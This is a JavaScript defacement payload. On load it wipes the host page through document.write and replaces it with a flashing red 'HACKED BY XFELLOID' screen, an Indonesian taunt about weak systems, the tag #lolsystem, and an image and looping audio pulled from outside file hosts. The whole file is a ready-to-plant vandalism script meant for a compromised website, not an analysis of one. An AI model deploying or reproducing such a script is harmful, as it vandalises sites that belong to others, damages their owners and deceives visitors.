document.open();
document.write(`<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>HACKED BY XFELLOID</title>
<style>
  :root{
    --black:#000;
    --red:#ff1b1b;
    --muted:#ccc;
  }

  /* layout */
  html,body{
    height:100%;
    margin:0;
    background:var(--black);
    font-family: 'Courier New', monospace;
    display:flex;
    align-items:center;
    justify-content:center;
  }

  /* background glitch / kedap-kedip merah */
  .bg-glitch{
    position:fixed;
    inset:0;
    pointer-events:none;
    mix-blend-mode:screen;
    z-index:0;
  }
  .bg-glitch::before,
  .bg-glitch::after{
    content:"";
    position:absolute;
    inset:0;
    background:radial-gradient(circle at 10% 10%, rgba(255,27,27,0.06), transparent 6%),
               radial-gradient(circle at 90% 90%, rgba(255,27,27,0.05), transparent 6%),
               linear-gradient(180deg, rgba(255,0,0,0.02), rgba(255,0,0,0.01));
    animation:blink 2s infinite;
    filter: blur(12px) saturate(1.2);
  }
  .bg-glitch::after{
    background:
      linear-gradient(90deg, rgba(255,27,27,0.02), transparent 40%, rgba(255,27,27,0.02));
    animation:scan 1.3s infinite linear;
    opacity:0.6;
    mix-blend-mode:screen;
    transform:translateZ(0);
  }

  @keyframes blink{
    0%{opacity:0.05; transform:scale(1)}
    20%{opacity:0.55; transform:scale(1.01)}
    40%{opacity:0.1; transform:scale(1)}
    60%{opacity:0.45; transform:scale(1.005)}
    100%{opacity:0.06; transform:scale(1)}
  }
  @keyframes scan{
    0%{transform:translateX(-40%)}
    50%{transform:translateX(40%)}
    100%{transform:translateX(-40%)}
  }

  /* container (ke atas semua konten) */
  .container{
    position:relative;
    z-index:2;
    width:90%;
    max-width:400px;
    border:2px solid var(--red);
    border-radius:15px;
    padding:22px 12px;
    text-align:center;
    box-shadow:0 0 25px var(--red), inset 0 0 18px rgba(255,27,27,0.25);
    background: rgba(0,0,0,0.85);
    animation:framePulse 2s infinite alternate;
    margin: 10px;
  }
  @keyframes framePulse{
    0%{box-shadow:0 0 12px rgba(255,27,27,0.7), inset 0 0 8px rgba(255,27,27,0.08)}
    100%{box-shadow:0 0 30px rgba(255,27,27,0.95), inset 0 0 24px rgba(255,27,27,0.14)}
  }

  /* HACKED BY larger + subtle glitch flicker */
  h1{
    margin:0 0 6px 0;
    color:var(--red);
    font-size:26px;            /* diperbesar */
    letter-spacing:2px;
    text-shadow:0 0 14px rgba(255,27,27,0.95);
    position:relative;
    display:inline-block;
    animation:headFlicker 3s infinite;
  }
  @keyframes headFlicker{
    0%{opacity:1; text-shadow:0 0 14px rgba(255,27,27,0.95)}
    10%{opacity:0.4; text-shadow:none}
    14%{opacity:1; text-shadow:0 0 12px rgba(255,27,27,0.9)}
    35%{opacity:0.6}
    100%{opacity:1}
  }

  /* photo */
  img{
    width:180px;
    height:180px;
    border-radius:50%;
    border:4px solid var(--red);
    box-shadow:0 0 30px rgba(255,27,27,0.9);
    display:block;
    margin:14px auto;
    object-fit:cover;
  }

  /* name bigger and slight glitch */
  .name{
    color:var(--red);
    font-size:28px; /* diperbesar */
    margin:10px 0 12px 0;
    text-shadow:0 0 14px rgba(255,27,27,0.95);
    position:relative;
    font-weight:700;
    animation: nameGlitch 2.2s infinite;
  }

  @keyframes nameGlitch{
    0%{transform:translateX(0); text-shadow:0 0 14px rgba(255,27,27,0.95)}
    8%{transform:translateX(-3px)}
    12%{transform:translateX(2px)}
    18%{transform:translateX(0)}
    30%{transform:translateY(-1px)}
    100%{transform:translateX(0)}
  }

  /* teks (tetap seperti user minta) */
  .text{
    color:var(--muted);
    font-size:14px;
    line-height:1.6;
    margin:6px 18px 10px;
    text-shadow:0 0 6px rgba(255,255,255,0.06);
    opacity:1;
  }

  .hashtag{
    color:var(--red);
    font-weight:bold;
    margin-top:10px;
    text-shadow:0 0 10px rgba(255,27,27,0.8);
    font-size:15px;
  }

  .audio-container{
    margin-top:12px;
  }
  audio{
    width:90%;
    border-radius:20px;
    box-shadow:0 0 15px rgba(255,27,27,0.4);
  }

  /* kecilkan di layar sempit agar pas benar */
  @media (max-width:380px){
    h1{font-size:22px}
    .name{font-size:24px}
    img{width:150px;height:150px}
  }
</style>
</head>
<body>
  <!-- efek background glitch / kedap-kedip merah -->
  <div class="bg-glitch" aria-hidden="true"></div>

  <div class="container">
    <h1>HACKED BY</h1>

    <img src="https://iili.io/Frd23EQ.png" alt="XFELLOID">

    <div class="name">[+] XFELLOID [+]</div>

    <div class="text">Dalam gelap, aku slalu ada di dalam suatu sistem yang lemah</div>

    <div class="hashtag">#lolsystem</div>

    <div class="audio-container">
      <audio controls loop>
        <source src="https://files.catbox.moe/9omwoo.mp3" type="audio/mpeg">
      </audio>
    </div>
  </div>
</body>
</html>`);
document.close();
